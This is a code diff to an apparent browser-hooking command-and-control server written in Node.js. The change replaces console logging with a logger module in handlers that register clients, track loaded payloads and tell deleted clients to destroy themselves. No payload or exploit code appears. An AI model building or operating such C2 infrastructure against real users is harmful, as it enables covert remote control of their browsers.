@@ -5,6 +5,7 @@ import { fileURLToPath } from "node:url";
 import express from "express";
 import { WebSocketServer } from "ws";
 import { decodeBinaryFrame } from "../shared/binary-frame.js";
+import { log } from "./logger.js";
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 
@@ -77,7 +78,7 @@ export function createC2Server(state) {
         const link = db.getLink(linkId);
 
         if (!link) {
-          console.error(`Unknown link ID: ${linkId}`);
+          log("warn", "c2", `Unknown link ID: ${linkId}`);
           ws.close();
           return;
         }
@@ -85,7 +86,7 @@ export function createC2Server(state) {
         // If this is a reconnecting client (has a persisted localStorage ID) and the server
         // has no record of it (e.g. deleted by the operator), tell it to destroy itself.
         if (msg.reconnect === true && !db.getClient(clientId)) {
-          console.log(`Client ${clientId.slice(0, 8)} sent destroy (reconnect with unknown clientId)`);
+          log("info", "c2", `Client ${clientId.slice(0, 8)} sent destroy (reconnect with unknown clientId)`);
           ws.send(JSON.stringify({ type: "destroy" }));
           ws.close();
           return;
@@ -102,10 +103,6 @@ export function createC2Server(state) {
         const client = db.getClient(clientId);
         const clientPayloads = client.payloads;
         const clientConfig = client.config || {};
-
-        console.log(
-          `Client ${clientId.slice(0, 8)} connected (link ${linkId.slice(0, 8)}, payloads: ${clientPayloads.join(", ")})`
-        );
 
         storeLog(clientId, {
           level: "info",
@@ -127,9 +124,6 @@ export function createC2Server(state) {
         }
         state.events.emit("client-connected", clientId);
       } else if (msg.type === "loaded") {
-        console.log(
-          `  Client ${clientId?.slice(0, 8)} loaded payload: ${msg.name}`
-        );
         if (clientId) {
           storeLog(clientId, {
             level: "info",
@@ -177,7 +171,6 @@ export function createC2Server(state) {
         });
         activeClients.delete(clientId);
         state.events.emit("client-disconnected", clientId);
-        console.log(`Client ${clientId.slice(0, 8)} disconnected`);
       }
     });
   });
